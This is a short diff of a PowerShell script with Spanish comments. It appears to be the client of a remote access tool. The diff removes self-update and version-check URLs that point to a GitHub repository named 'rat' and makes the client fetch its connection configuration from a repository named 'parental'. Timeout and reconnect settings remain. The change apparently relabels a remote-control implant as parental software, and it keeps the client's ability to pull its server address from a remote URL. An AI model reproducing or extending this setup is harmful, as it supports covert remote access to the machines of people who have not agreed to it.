@@ -1,9 +1,6 @@
 
 
-$CurrentScriptVersion = "1.0.2"
-$VersionCheckUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/version"
-$ScriptDownloadUrlTemplate = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1" 
-$UriConfigUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"
+$UriConfigUrl = "https://raw.githubusercontent.com/icyyboy/parental/refs/heads/main/url"
 
 $connectionTimeoutSeconds = 300 # Timeout para la conexión inicial y para ReceiveAsync
 $reconnectDelaySeconds = 1      # Tiempo de espera mínimo entre intentos de reconexión
